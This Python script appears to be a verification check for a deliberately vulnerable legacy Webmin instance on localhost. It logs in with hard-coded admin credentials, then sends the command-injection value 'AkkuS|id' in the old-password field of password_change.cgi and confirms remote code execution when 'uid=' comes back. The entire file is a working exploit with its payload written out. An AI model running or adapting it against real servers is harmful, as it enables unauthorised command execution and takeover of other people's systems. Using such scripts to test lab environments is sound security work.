#!/usr/bin/env python3
import http.cookiejar
import urllib.parse
import urllib.request

BASE = "http://127.0.0.1:10000"


def post(path: str, data: dict[str, str], opener: urllib.request.OpenerDirector) -> str:
    encoded = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(f"{BASE}{path}", data=encoded)
    with opener.open(req, timeout=10) as resp:
        return resp.read().decode("utf-8")


def main() -> None:
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

    login_body = post(
        "/session_login.cgi",
        {"user": "admin", "pass": "webmin-legacy"},
        opener,
    )
    if "Invalid login" in login_body:
        raise SystemExit("Login failed.")

    rce_body = post(
        "/password_change.cgi",
        {"user": "root", "old": "AkkuS|id", "new1": "x", "new2": "x"},
        opener,
    )
    if "uid=" not in rce_body:
        raise SystemExit("RCE check failed.")

    print("Legacy Webmin RCE check passed.")


if __name__ == "__main__":
    main()
